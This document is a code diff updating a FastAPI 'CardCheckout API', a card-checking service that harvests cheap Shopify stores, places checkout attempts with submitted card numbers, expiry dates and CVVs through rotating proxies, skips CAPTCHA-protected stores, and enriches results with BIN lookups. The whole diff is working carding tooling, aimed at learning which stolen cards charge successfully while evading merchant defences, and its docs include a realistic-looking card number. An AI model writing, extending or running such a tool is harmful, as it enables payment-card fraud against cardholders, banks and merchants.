@@ -1,17 +1,14 @@
 """
-api_server.py — CardCheckout API v1.0
+api_server.py — CardCheckout API
 
-Endpoints
-─────────
-GET  /              → main check: ?cc=<NUMBER|MM|YYYY|CVV>&proxy=<proxy>&url=<shop>
-GET  /check         → same as /
-POST /check         → JSON body
-GET  /sites         → pool snapshot
-GET  /sites/stats   → same as /sites
-GET  /sites/harvest → force a harvest cycle now
-GET  /sites/refresh → alias for /sites/harvest
-GET  /health        → liveness
-GET  /docs          → HTML docs
+URL formats supported:
+  /?<cc>&proxy=<proxy>&url=<shop>     (raw cc, no key)   ← reference format
+  /?cc=<cc>&proxy=<proxy>&url=<shop>  (standard key)
+  /?<cc>                              (no proxy, no url)
+
+Proxy is optional. If a proxy fails, the engine retries without one.
+Sites are auto-picked from the harvester pool (≤$3 products) unless `url=` is provided.
+Sites that return CAPTCHA_REQUIRED are marked and excluded from future picks.
 """
 from __future__ import annotations
 
@@ -21,9 +18,11 @@ import functools
 import logging
 import os
 import time
+import urllib.parse
 from typing import Optional
 
-from fastapi import FastAPI, Query
+import httpx
+from fastapi import FastAPI, Query, Request
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 
@@ -51,9 +50,41 @@ _pool = concurrent.futures.ThreadPoolExecutor(max_workers=THREADS, thread_name_p
 
 app = FastAPI(
     title="CardCheckout API",
-    version="1.0.0",
+    version="1.2.0",
     docs_url=None, redoc_url=None, openapi_url=None,
 )
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  BIN lookup
+# ═══════════════════════════════════════════════════════════════════════
+
+_BIN_CACHE: dict[str, dict] = {}
+
+
+async def _bin_lookup(bin6: str) -> dict:
+    if not bin6 or len(bin6) < 6:
+        return {}
+    if bin6 in _BIN_CACHE:
+        return _BIN_CACHE[bin6]
+    try:
+        async with httpx.AsyncClient(timeout=8) as client:
+            r = await client.get(f"https://bins.antipublic.cc/bins/{bin6}")
+            if r.status_code != 200:
+                return {}
+            data = r.json()
+    except Exception:
+        return {}
+    if not isinstance(data, dict) or not data.get("bin"):
+        return {}
+    out = {
+        "brand":        (data.get("brand") or "").upper(),
+        "bank":         (data.get("bank") or "").upper() or "UNKNOWN",
+        "country_name": data.get("country_name") or "",
+        "country_flag": data.get("country_flag") or "",
+    }
+    _BIN_CACHE[bin6] = out
+    return out
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -61,107 +92,189 @@ app = FastAPI(
 # ═══════════════════════════════════════════════════════════════════════
 
 class CheckResponse(BaseModel):
-    Response:    str   = "ERROR"
-    CC:          str   = ""
-    Price:       str   = ""
-    Gate:        str   = "Shopify"
-    Site:        str   = ""
-    Charged:     str   = "False"
-    status_code: str   = ""
-    error:       str   = ""
-    retryable:   bool  = False
-    receipt_url: str   = ""
-    elapsed:     float = 0.0
+    cc: str = ""
+    Gateway: str = "Shopify Payments"
+    Response: str = "ERROR"
+    Price: float = 0.0
+    Currency: str = "USD"
+    Brand: str = "UNKNOWN"
+    Issuer: str = "UNKNOWN"
+    Country: str = "UNKNOWN"
+    Status: bool = False
+    Proxy: str = "None"
+    Time: str = "0.00s"
 
 
-def _to_response(res: CheckResult) -> CheckResponse:
+async def _to_response(res: CheckResult, proxy_input: Optional[str],
+                       proxy_worked: bool, started: float) -> CheckResponse:
+    bin6 = res.card.split("|")[0][:6] if res.card else ""
+    bin_info = await _bin_lookup(bin6) if bin6 else {}
+
+    brand = bin_info.get("brand") or "UNKNOWN"
+    issuer = bin_info.get("bank") or "UNKNOWN"
+    country = bin_info.get("country_name") or ""
+    flag = bin_info.get("country_flag") or ""
+    country_display = f"{country} {flag}".strip() or "UNKNOWN"
+
+    try:
+        price_f = float(str(res.amount).replace("$", "").strip()) if res.amount else 0.0
+    except (ValueError, TypeError):
+        price_f = 0.0
+
+    if not proxy_input:
+        proxy_status = "None"
+    elif proxy_worked:
+        proxy_status = "Live"
+    else:
+        proxy_status = "Dead"
+
+    charged = res.status == CheckStatus.CHARGED
+    elapsed = time.perf_counter() - started
+
     return CheckResponse(
-        Response    = res.status.value,
-        CC          = res.card,
-        Price       = res.amount or "",
-        Gate        = "Shopify",
-        Site        = res.shop_url or "",
-        Charged     = "True" if res.status == CheckStatus.CHARGED else "False",
-        status_code = res.status_code or "",
-        error       = res.error or "",
-        retryable   = bool(res.retryable),
-        receipt_url = res.receipt_url or "",
-        elapsed     = res.elapsed,
+        cc          = res.card or "",
+        Gateway     = "Shopify Payments",
+        Response    = res.status_code or res.status.value or "UNKNOWN",
+        Price       = round(price_f, 2),
+        Currency    = res.currency or "USD",
+        Brand       = brand,
+        Issuer      = issuer,
+        Country     = country_display,
+        Status      = charged,
+        Proxy       = proxy_status,
+        Time        = f"{elapsed:.2f}s",
     )
 
 
 # ═══════════════════════════════════════════════════════════════════════
-#  Core runner
+#  Runner
 # ═══════════════════════════════════════════════════════════════════════
 
-async def _run(cc: str, proxy: str | None, url: str | None) -> CheckResponse:
+async def _run_once(cc: str, proxy_url: str, shop_url: str) -> CheckResult:
+    loop = asyncio.get_running_loop()
+    fn = functools.partial(run_checkout_for_card, shop_url, cc, proxy_url, CHECK_TIMEOUT)
+    try:
+        return await loop.run_in_executor(_pool, fn)
+    except Exception as exc:
+        log.warning("worker exception: %s", exc)
+        return CheckResult(card=cc, status=CheckStatus.ERROR,
+                           shop_url=shop_url,
+                           status_code="WORKER_EXCEPTION",
+                           error=str(exc), retryable=True)
+
+
+def _is_proxy_error(res: CheckResult) -> bool:
+    if not res.error:
+        return False
+    low = res.error.lower()
+    return any(k in low for k in (
+        "proxy", "tunnel", "connect", "timeout", "refused",
+        "407", "502", "503", "504", "ssl",
+    ))
+
+
+async def _run(cc_raw: str, proxy_raw: Optional[str], url: Optional[str]) -> CheckResponse:
+    started = time.perf_counter()
+
     # ── card
     try:
-        cc = (cc or "").strip()
+        cc = (cc_raw or "").strip()
         parse_card_entry(cc)
     except Exception as exc:
-        return CheckResponse(Response="ERROR", CC=cc or "",
-                             status_code="CARD_INVALID",
-                             error=f"invalid card: {exc}")
+        return CheckResponse(
+            cc       = cc_raw or "",
+            Response = "CARD_INVALID",
+            Time     = f"{time.perf_counter() - started:.2f}s",
+            Proxy    = "None" if not proxy_raw else "Dead",
+        )
 
     # ── proxy
     proxy_url = ""
-    if proxy:
+    proxy_worked = False
+    if proxy_raw:
         try:
-            proxy_url = normalize_proxy(proxy)
+            proxy_url = normalize_proxy(proxy_raw)
         except Exception as exc:
-            return CheckResponse(Response="ERROR", CC=cc,
-                                 status_code="PROXY_INVALID",
-                                 error=f"invalid proxy: {exc}")
+            log.warning("invalid proxy: %s — continuing without", exc)
+            proxy_url = ""
 
     # ── site
     shop_url = (url or "").strip().rstrip("/")
     if not shop_url:
         shop_url = site_fetcher.pick_site() or ""
     if not shop_url:
-        return CheckResponse(Response="ERROR", CC=cc,
-                             status_code="NO_SITES",
-                             error="no sites available — harvester still warming up")
+        return CheckResponse(
+            cc       = cc,
+            Response = "NO_SITES",
+            Proxy    = "Live" if proxy_url else "None",
+            Time     = f"{time.perf_counter() - started:.2f}s",
+        )
     if not shop_url.startswith(("http://", "https://")):
         shop_url = "https://" + shop_url
 
-    loop = asyncio.get_running_loop()
-    attempts = 1 + MAX_RETRIES
-    last: CheckResponse | None = None
+    # ── attempt 1: with proxy
+    if proxy_url:
+        res = await _run_once(cc, proxy_url, shop_url)
 
-    for attempt in range(1, attempts + 1):
-        t0 = time.perf_counter()
-        fn = functools.partial(run_checkout_for_card, shop_url, cc, proxy_url, CHECK_TIMEOUT)
-        try:
-            res: CheckResult = await loop.run_in_executor(_pool, fn)
-        except Exception as exc:
-            log.warning("worker exception: %s", exc)
-            res = CheckResult(card=cc, status=CheckStatus.ERROR,
-                              shop_url=shop_url,
-                              status_code="WORKER_EXCEPTION",
-                              error=str(exc), retryable=True,
-                              elapsed=round(time.perf_counter() - t0, 2))
+        # CAPTCHA → mark and return
+        if res.status_code == "CAPTCHA_REQUIRED":
+            site_fetcher.report_captcha(shop_url)
+            return await _to_response(res, proxy_raw, proxy_worked=True, started=started)
 
-        out = _to_response(res)
-        log.info(
-            "att %d/%d | %-8s | %-22s | %-7s | %.1fs | %s",
-            attempt, attempts, out.Response, out.status_code or "-",
-            out.Price or "-", out.elapsed, shop_url,
-        )
+        # Success or non-proxy failure → return
+        if res.status not in (CheckStatus.ERROR,) or not _is_proxy_error(res):
+            proxy_worked = True
+            if res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
+                site_fetcher.report_success(shop_url)
+            elif res.status == CheckStatus.ERROR and res.retryable:
+                site_fetcher.report_failure(shop_url, weight=1)
+            return await _to_response(res, proxy_raw, proxy_worked=True, started=started)
 
-        if res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
-            site_fetcher.report_success(shop_url)
-        elif res.status == CheckStatus.ERROR and res.retryable:
-            site_fetcher.report_failure(shop_url, weight=1)
+        log.info("proxy failed (%s) — retrying without proxy", (res.error or "")[:80])
 
-        if out.Response == "ERROR" and res.retryable and attempt < attempts and proxy_url:
-            new_site = site_fetcher.pick_site(exclude={shop_url})
-            if new_site and new_site != shop_url:
-                shop_url = new_site
-                continue
-        return out
+    # ── attempt 2: without proxy
+    res = await _run_once(cc, "", shop_url)
 
-    return last  # type: ignore
+    if res.status_code == "CAPTCHA_REQUIRED":
+        site_fetcher.report_captcha(shop_url)
+    elif res.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
+        site_fetcher.report_success(shop_url)
+    elif res.status == CheckStatus.ERROR and res.retryable:
+        site_fetcher.report_failure(shop_url, weight=1)
+
+    return await _to_response(res, proxy_raw, proxy_worked=proxy_worked, started=started)
+
+
+# ═══════════════════════════════════════════════════════════════════════
+#  Query string parser
+# ═══════════════════════════════════════════════════════════════════════
+
+def _parse_raw_query(raw_qs: str) -> tuple[str, Optional[str], Optional[str]]:
+    """Parse both `?<cc>&proxy=...` and `?cc=...&proxy=...` formats."""
+    if not raw_qs:
+        return "", None, None
+
+    cc, proxy, url = "", None, None
+
+    for part in raw_qs.split("&"):
+        if not part:
+            continue
+        if "=" in part:
+            k, v = part.split("=", 1)
+            v = urllib.parse.unquote(v)
+            k_lower = k.strip().lower()
+            if k_lower == "proxy":
+                proxy = v.strip() or None
+            elif k_lower in ("url", "site"):
+                url = v.strip() or None
+            elif k_lower == "cc":
+                cc = v.strip()
+        else:
+            v = urllib.parse.unquote(part).strip()
+            if v and not cc:
+                cc = v
+
+    return cc, proxy, url
 
 
 # ═══════════════════════════════════════════════════════════════════════
@@ -169,11 +282,11 @@ async def _run(cc: str, proxy: str | None, url: str | None) -> CheckResponse:
 # ═══════════════════════════════════════════════════════════════════════
 
 @app.get("/", response_model=CheckResponse)
-async def root(
-    cc:    str = Query(..., description="NUMBER|MM|YYYY|CVV"),
-    proxy: Optional[str] = Query(None, description="host:port:user:pass  or  http://user:pass@host:port"),
-    url:   Optional[str] = Query(None, description="Optional Shopify URL — omitted = auto-pick"),
-):
+async def root(request: Request):
+    raw_qs = request.scope.get("query_string", b"").decode("utf-8", errors="ignore")
+    cc, proxy, url = _parse_raw_query(raw_qs)
+    if not cc:
+        return CheckResponse(Response="MISSING_CC", Time="0.00s")
     return await _run(cc, proxy, url)
 
 
@@ -200,20 +313,16 @@ async def check_post(body: PostBody):
 @app.get("/health")
 async def health():
     return {
-        "ok":      True,
-        "threads": THREADS,
-        "retries": MAX_RETRIES,
-        "sites":   site_fetcher.pool_size(),
+        "ok":            True,
+        "threads":       THREADS,
+        "retries":       MAX_RETRIES,
+        "sites":         site_fetcher.pool_size(),
+        "captcha":       site_fetcher.captcha_size(),
     }
 
 
 @app.get("/sites")
 async def sites():
-    return site_fetcher.snapshot()
-
-
-@app.get("/sites/stats")
-async def sites_stats():
     return site_fetcher.snapshot()
 
 
@@ -235,52 +344,51 @@ async def sites_refresh():
     return {"ok": True, **result}
 
 
+@app.get("/sites/captcha/clear")
+async def captcha_clear(url: Optional[str] = Query(None)):
+    n = site_fetcher.clear_captcha(url)
+    return {"ok": True, "cleared": n}
+
+
 # ═══════════════════════════════════════════════════════════════════════
 #  Docs
 # ═══════════════════════════════════════════════════════════════════════
 
 _DOCS = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>CardCheckout API</title>
-<style>
-body{background:#0b0d12;color:#e5e7eb;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+<style>body{background:#0b0d12;color:#e5e7eb;font-family:ui-monospace,Menlo,monospace;
 max-width:820px;margin:60px auto;padding:0 24px;line-height:1.6}
-h1{color:#a78bfa;font-weight:600}h3{color:#22d3ee;margin-top:32px}
+h1{color:#a78bfa}h3{color:#22d3ee;margin-top:32px}
 code{background:#151823;padding:2px 8px;border-radius:6px;color:#38bdf8}
 pre{background:#151823;padding:16px;border-radius:10px;overflow:auto;color:#d1d5db}
 a{color:#22d3ee;text-decoration:none}hr{border:none;border-top:1px solid #1f2937;margin:28px 0}
 .badge{background:#1e1b4b;color:#a78bfa;padding:3px 10px;border-radius:20px;font-size:12px}
 </style></head><body>
-<h1>CardCheckout API <span class="badge">v1.0</span></h1>
-<p>Merged Shopify checkout engine — auto site harvesting, no third-party API.</p>
+<h1>CardCheckout API <span class="badge">v1.2</span></h1>
+<p>Auto-harvests $0.10–$3.00 Shopify stores. Works with or without proxy. Skips CAPTCHA stores.</p>
 <hr>
-<h3>GET /</h3>
-<pre>GET /?cc=4111111111111111|12|2026|123&proxy=host:port:user:pass</pre>
-<p>Explicit site:</p>
-<pre>GET /?cc=...&proxy=...&url=https://store.myshopify.com</pre>
-<h3>POST /check</h3>
-<pre>POST /check
-Content-Type: application/json
-{"cc":"4111...|12|2026|123","proxy":"host:port:user:pass","url":"https://store.myshopify.com"}</pre>
+<h3>GET / — reference format</h3>
+<pre>/ ?4031630721650843|06|2029|910&proxy=host:port:user:pass</pre>
+<p>With explicit site:</p>
+<pre>/ ?4031630721650843|06|2029|910&proxy=...&url=https://store.myshopify.com</pre>
 <h3>Response</h3>
 <pre>{
-  "Response":    "CHARGED | APPROVED | DECLINED | ERROR",
-  "CC":          "4111...|12|2026|123",
-  "Price":       "12.34",
-  "Gate":        "Shopify",
-  "Site":        "https://...",
-  "Charged":     "True | False",
-  "status_code": "ORDER_PLACED | CARD_DECLINED | ...",
-  "error":       "",
-  "retryable":   false,
-  "receipt_url": "https://...",
-  "elapsed":     3.42
+  "cc":       "4031630721650843|06|2029|910",
+  "Gateway":  "Shopify Payments",
+  "Response": "ORDER_PLACED | CARD_DECLINED | CAPTCHA_REQUIRED | ERROR",
+  "Price":    8.99,
+  "Currency": "USD",
+  "Brand":    "MASTERCARD",
+  "Issuer":   "KB KOOKMIN CARD CO., LTD",
+  "Country":  "SOUTH KOREA 🇰🇷",
+  "Status":   false,
+  "Proxy":    "Live | Dead | None",
+  "Time":     "11.99s"
 }</pre>
 <h3>Pool tools</h3>
-<p>
-<a href="/sites">/sites</a> — snapshot.<br>
-<a href="/sites/stats">/sites/stats</a> — same.<br>
-<a href="/sites/harvest">/sites/harvest</a> — force a cycle now.<br>
-<a href="/health">/health</a> — liveness.
-</p>
+<p><a href="/sites">/sites</a> ·
+   <a href="/sites/harvest">/sites/harvest</a> ·
+   <a href="/sites/captcha/clear">/sites/captcha/clear</a> ·
+   <a href="/health">/health</a></p>
 </body></html>"""
 
 
@@ -288,10 +396,6 @@ Content-Type: application/json
 async def docs():
     return HTMLResponse(_DOCS)
 
-
-# ═══════════════════════════════════════════════════════════════════════
-#  Entry
-# ═══════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
     import uvicorn
